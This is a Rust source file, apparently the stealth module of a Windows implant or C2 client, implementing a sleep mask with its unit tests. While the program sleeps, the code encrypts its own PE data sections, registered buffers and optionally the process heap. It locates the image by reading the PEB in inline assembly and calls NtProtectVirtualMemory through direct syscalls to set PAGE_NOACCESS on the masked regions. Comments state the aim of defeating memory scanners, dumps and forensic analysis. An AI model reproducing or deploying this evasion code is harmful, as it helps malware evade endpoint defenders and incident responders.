// Client/core/src/stealth/mask.rs
// Memory & Heap Obfuscation (Masking)
//
// Phase 2: Implements Sleep Mask — XOR-encrypts sensitive memory regions
// during sleep intervals to protect against memory dumps and forensic analysis.

use winapi::um::heapapi::HeapWalk;
use winapi::um::minwinbase::{PROCESS_HEAP_ENTRY, PROCESS_HEAP_ENTRY_BUSY};
use winapi::um::winnt::HANDLE;

/// XOR-Masks entries in a private heap.
pub unsafe fn mask_heap(h_heap: HANDLE, mask: u8) {
    let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
    while HeapWalk(h_heap, &mut entry) != 0 {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 {
            let data =
                std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
            for b in data {
                *b ^= mask;
            }
        }
    }
}

/// Best-effort default heap mask using a long AES-derived stream (not 8-byte repeat).
/// Call only while other threads are suspended (see `with_threads_suspended`).
pub unsafe fn mask_default_heap(key: &[u8]) {
    use winapi::um::heapapi::GetProcessHeap;
    let h = GetProcessHeap();
    if h.is_null() {
        return;
    }
    let stream = expand_mask_key(key, 4096);
    let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
    while HeapWalk(h, &mut entry) != 0 {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 && entry.cbData > 0 {
            let data =
                std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
            for (i, b) in data.iter_mut().enumerate() {
                *b ^= stream[i % stream.len()];
            }
        }
    }
}

/// Expand key material into AES-256-CTR keystream (domain-separated nonce).
/// Symmetric: XOR with the same stream twice restores plaintext.
pub fn expand_mask_key(key: &[u8], len: usize) -> Vec<u8> {
    use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
    use aes::Aes256;

    let mut key32 = [0u8; 32];
    if key.is_empty() {
        return vec![0u8; len];
    }
    for (i, b) in key.iter().enumerate() {
        key32[i % 32] ^= *b;
        key32[i % 32] = key32[i % 32].wrapping_add((i as u8).wrapping_mul(17));
    }
    let cipher = Aes256::new(GenericArray::from_slice(&key32));

    // 128-bit counter: domain || counter_be64
    let mut counter = [0u8; 16];
    counter[0..8].copy_from_slice(b"cslpmsk2"); // sleep mask v2
    let mut out = vec![0u8; len];
    let mut off = 0usize;
    let mut ctr_val: u64 = 0;
    while off < len {
        counter[8..16].copy_from_slice(&ctr_val.to_be_bytes());
        let mut block = *GenericArray::<u8, aes::cipher::consts::U16>::from_slice(&counter);
        cipher.encrypt_block(&mut block);
        let n = (len - off).min(16);
        out[off..off + n].copy_from_slice(&block[..n]);
        off += n;
        ctr_val = ctr_val.wrapping_add(1);
    }
    out
}

#[cfg(test)]
mod mask_key_tests {
    use super::expand_mask_key;

    #[test]
    fn aes_ctr_keystream_deterministic_and_long() {
        let k = b"01234567890123456789012345678901";
        let a = expand_mask_key(k, 100);
        let b = expand_mask_key(k, 100);
        assert_eq!(a, b);
        assert_eq!(a.len(), 100);
        // Not all zeros
        assert!(a.iter().any(|&x| x != 0));
        // Different keys differ
        let c = expand_mask_key(b"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 100);
        assert_ne!(a, c);
    }

    #[test]
    fn keystream_xor_twice_is_identity() {
        let k = b"01234567890123456789012345678901";
        let stream = expand_mask_key(k, 64);
        let mut data = *b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqr";
        let orig = data;
        for (i, b) in data.iter_mut().enumerate() {
            *b ^= stream[i];
        }
        for (i, b) in data.iter_mut().enumerate() {
            *b ^= stream[i];
        }
        assert_eq!(data, orig);
    }
}

/// 🛡️ Phase 2: Encrypt non-executable PE sections during sleep.
pub unsafe fn mask_pe_sections(xor_key: &[u8]) {
    let image_base: *const u8;
    #[cfg(target_arch = "x86_64")]
    {
        std::arch::asm!(
            "mov rax, gs:[0x60]",
            "mov rax, [rax + 0x10]",
            out("rax") image_base,
        );
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        image_base = std::ptr::null();
    }

    if image_base.is_null() {
        return;
    }

    mask_pe_sections_inner(image_base, xor_key);
}

/// Encrypt/decrypt PE sections (.data, .rdata, .pdata, .rsrc) with expanded key stream.
unsafe fn mask_pe_sections_inner(image_base: *const u8, xor_key: &[u8]) {
    let dos_header = image_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        return;
    }

    #[cfg(target_arch = "x86_64")]
    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    #[cfg(not(target_arch = "x86_64"))]
    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS32;

    let section_header = nt_headers
        .cast::<u8>()
        .offset(24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as isize)
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

    let section_count = (*nt_headers).FileHeader.NumberOfSections;
    let stream = expand_mask_key(xor_key, 8192);
    let target_names: &[&[u8]] = &[b".data", b".rdata", b".pdata", b".rsrc"];

    for i in 0..section_count {
        let section = section_header.add(i as usize);
        let should_mask = target_names.iter().any(|&target| {
            let mut matches = true;
            for j in 0..target.len() {
                if target[j] != (*section).Name[j] {
                    matches = false;
                    break;
                }
            }
            matches
        });
        // Skip executable sections
        let chars = (*section).Characteristics;
        if (chars & 0x20000000) != 0 {
            continue; // IMAGE_SCN_MEM_EXECUTE
        }
        if !should_mask {
            continue;
        }

        let section_addr = image_base.offset((*section).VirtualAddress as isize) as *mut u8;
        let section_size = *(*section).Misc.VirtualSize() as usize;
        if section_size == 0 {
            continue;
        }

        // RW for write, then NOACCESS after encrypt is applied by caller via protect_sleep_pages
        let section_data = std::slice::from_raw_parts_mut(section_addr, section_size);
        for (j, b) in section_data.iter_mut().enumerate() {
            *b ^= stream[j % stream.len()];
        }
    }
}

/// Best-effort: VirtualProtect region to PAGE_NOACCESS (sleep) or restore RW.
#[cfg(windows)]
pub unsafe fn protect_region(addr: *mut u8, size: usize, protect: u32) -> u32 {
    let mut old: u32 = 0;
    let mut base = addr as usize;
    let mut region = size;
    let _ = crate::syscall_nt!(
        b"NtProtectVirtualMemory",
        0xFFFFFFFFFFFFFFFFusize,
        &mut base as *mut usize,
        &mut region as *mut usize,
        protect,
        &mut old as *mut u32,
    );
    old
}

/// Suspend all other threads in the process, run `f`, then resume.
/// Used around sleep-mask so concurrent workers do not race encrypted sections.
#[cfg(windows)]
pub unsafe fn with_threads_suspended<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::{
        GetCurrentProcessId, GetCurrentThreadId, OpenThread, ResumeThread, SuspendThread,
    };
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use winapi::um::winnt::THREAD_SUSPEND_RESUME;

    let pid = GetCurrentProcessId();
    let self_tid = GetCurrentThreadId();
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    let mut suspended: Vec<winapi::shared::ntdef::HANDLE> = Vec::new();
    if !snap.is_null() && snap != winapi::um::handleapi::INVALID_HANDLE_VALUE {
        let mut te: THREADENTRY32 = std::mem::zeroed();
        te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        if Thread32First(snap, &mut te) != 0 {
            loop {
                if te.th32OwnerProcessID == pid && te.th32ThreadID != self_tid {
                    let h = OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32ThreadID);
                    if !h.is_null() {
                        SuspendThread(h);
                        suspended.push(h);
                    }
                }
                if Thread32Next(snap, &mut te) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }

    let result = f();

    for h in suspended {
        ResumeThread(h);
        CloseHandle(h);
    }
    result
}

/// PAGE_NOACCESS / PAGE_READWRITE for sleep mask region protection.
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READWRITE: u32 = 0x04;

/// Collect PE section ranges that sleep-mask encrypts (same selection as mask_pe_sections_inner).
#[cfg(windows)]
unsafe fn sleep_mask_section_ranges() -> Vec<(*mut u8, usize)> {
    let mut out = Vec::new();
    let image_base: *const u8;
    #[cfg(target_arch = "x86_64")]
    {
        std::arch::asm!(
            "mov rax, gs:[0x60]",
            "mov rax, [rax + 0x10]",
            out("rax") image_base,
        );
    }
    #[cfg(not(target_arch = "x86_64"))]
    {
        image_base = std::ptr::null();
    }
    if image_base.is_null() {
        return out;
    }
    let dos_header = image_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != 0x5A4D {
        return out;
    }
    #[cfg(target_arch = "x86_64")]
    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
    #[cfg(not(target_arch = "x86_64"))]
    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
        as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
    let section_header = nt_headers
        .cast::<u8>()
        .offset(24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as isize)
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let section_count = (*nt_headers).FileHeader.NumberOfSections;
    let target_names: &[&[u8]] = &[b".data", b".rdata", b".pdata", b".rsrc"];
    for i in 0..section_count {
        let section = section_header.add(i as usize);
        let should_mask = target_names.iter().any(|&target| {
            let mut matches = true;
            for j in 0..target.len() {
                if target[j] != (*section).Name[j] {
                    matches = false;
                    break;
                }
            }
            matches
        });
        let chars = (*section).Characteristics;
        if (chars & 0x20000000) != 0 {
            continue;
        }
        if !should_mask {
            continue;
        }
        let section_addr = image_base.offset((*section).VirtualAddress as isize) as *mut u8;
        let section_size = *(*section).Misc.VirtualSize() as usize;
        if section_size == 0 {
            continue;
        }
        out.push((section_addr, section_size));
    }
    out
}

/// Product sleep-crypto enter: suspend peers → mask → PAGE_NOACCESS on masked regions.
/// Does **not** XOR the process default heap (that races Tokio and is opt-in unsafe only).
#[cfg(windows)]
pub unsafe fn sleep_mask_enter(key: &[u8]) {
    with_threads_suspended(|| {
        mask_pe_sections(key);
        mask_sensitive_regions(key);
        // While asleep, denylist reads of ciphertext (memory scanners / dumps).
        for (addr, size) in sleep_mask_section_ranges() {
            let _ = protect_region(addr, size, PAGE_NOACCESS);
        }
        for (addr, size) in sensitive_region_ranges() {
            let _ = protect_region(addr, size, PAGE_NOACCESS);
        }
    });
}

#[cfg(windows)]
pub unsafe fn sleep_mask_leave(key: &[u8]) {
    with_threads_suspended(|| {
        // Restore RW before XOR-decrypt so writes succeed.
        for (addr, size) in sleep_mask_section_ranges() {
            let _ = protect_region(addr, size, PAGE_READWRITE);
        }
        for (addr, size) in sensitive_region_ranges() {
            let _ = protect_region(addr, size, PAGE_READWRITE);
        }
        mask_sensitive_regions(key);
        mask_pe_sections(key);
    });
}

/// Unsafe experiment only — never wire as default product path.
#[cfg(windows)]
pub unsafe fn sleep_mask_enter_with_heap_unsafe(key: &[u8]) {
    with_threads_suspended(|| {
        mask_pe_sections(key);
        mask_sensitive_regions(key);
        mask_default_heap(key);
    });
}

#[cfg(not(windows))]
pub unsafe fn with_threads_suspended<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    f()
}

// ── Sensitive region whitelist (sleep-crypto) ──────────────────────────────

use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Mutex;

struct SensitiveRegion {
    id: u64,
    ptr: usize,
    len: usize,
    tag: u32,
}

static REGION_SEQ: AtomicU64 = AtomicU64::new(1);
static SENSITIVE_REGIONS: Mutex<Vec<SensitiveRegion>> = Mutex::new(Vec::new());

/// Register a buffer to XOR during sleep_mask_enter/leave. Returns region id.
pub fn register_sensitive_region(ptr: *mut u8, len: usize, tag: u32) -> u64 {
    if ptr.is_null() || len == 0 {
        return 0;
    }
    let id = REGION_SEQ.fetch_add(1, Ordering::Relaxed);
    if let Ok(mut g) = SENSITIVE_REGIONS.lock() {
        g.push(SensitiveRegion {
            id,
            ptr: ptr as usize,
            len,
            tag,
        });
    }
    id
}

pub fn unregister_sensitive_region(id: u64) {
    if id == 0 {
        return;
    }
    if let Ok(mut g) = SENSITIVE_REGIONS.lock() {
        g.retain(|r| r.id != id);
    }
}

/// XOR all registered regions with expanded keystream (symmetric).
pub unsafe fn mask_sensitive_regions(key: &[u8]) {
    let stream = expand_mask_key(key, 4096);
    if let Ok(g) = SENSITIVE_REGIONS.lock() {
        for r in g.iter() {
            if r.ptr == 0 || r.len == 0 {
                continue;
            }
            let data = std::slice::from_raw_parts_mut(r.ptr as *mut u8, r.len);
            for (i, b) in data.iter_mut().enumerate() {
                *b ^= stream[i % stream.len()];
            }
            let _ = r.tag; // reserved for selective NOACCESS later
        }
    }
}

/// Test helper: count registered regions.
pub fn sensitive_region_count() -> usize {
    SENSITIVE_REGIONS.lock().map(|g| g.len()).unwrap_or(0)
}

/// Snapshot of registered sensitive regions for PAGE_NOACCESS during sleep.
fn sensitive_region_ranges() -> Vec<(*mut u8, usize)> {
    let mut out = Vec::new();
    if let Ok(g) = SENSITIVE_REGIONS.lock() {
        for r in g.iter() {
            if r.ptr != 0 && r.len != 0 {
                out.push((r.ptr as *mut u8, r.len));
            }
        }
    }
    out
}

/// Unit-testable: after mask enter, section protect intent is NOACCESS (constant + helper present).
#[cfg(test)]
mod sleep_noaccess_tests {
    use super::{
        register_sensitive_region, sensitive_region_ranges, unregister_sensitive_region,
        PAGE_NOACCESS, PAGE_READWRITE,
    };

    #[test]
    fn page_noaccess_constant_is_windows_noaccess() {
        assert_eq!(PAGE_NOACCESS, 0x01);
        assert_eq!(PAGE_READWRITE, 0x04);
    }

    #[test]
    fn sensitive_region_ranges_tracks_registered() {
        let mut buf = [0u8; 16];
        let id = register_sensitive_region(buf.as_mut_ptr(), buf.len(), 9);
        let ranges = sensitive_region_ranges();
        assert!(ranges
            .iter()
            .any(|(p, l)| *p == buf.as_mut_ptr() && *l == 16));
        unregister_sensitive_region(id);
    }
}

#[cfg(test)]
mod sensitive_region_tests {
    use super::*;

    #[test]
    fn sensitive_region_xor_roundtrip() {
        let mut buf = *b"secret-session-key-material!!";
        let id = register_sensitive_region(buf.as_mut_ptr(), buf.len(), 1);
        assert!(id != 0);
        assert!(sensitive_region_count() >= 1);
        let key = b"01234567890123456789012345678901";
        unsafe {
            mask_sensitive_regions(key);
        }
        assert_ne!(&buf, b"secret-session-key-material!!");
        unsafe {
            mask_sensitive_regions(key);
        }
        assert_eq!(&buf, b"secret-session-key-material!!");
        unregister_sensitive_region(id);
    }
}
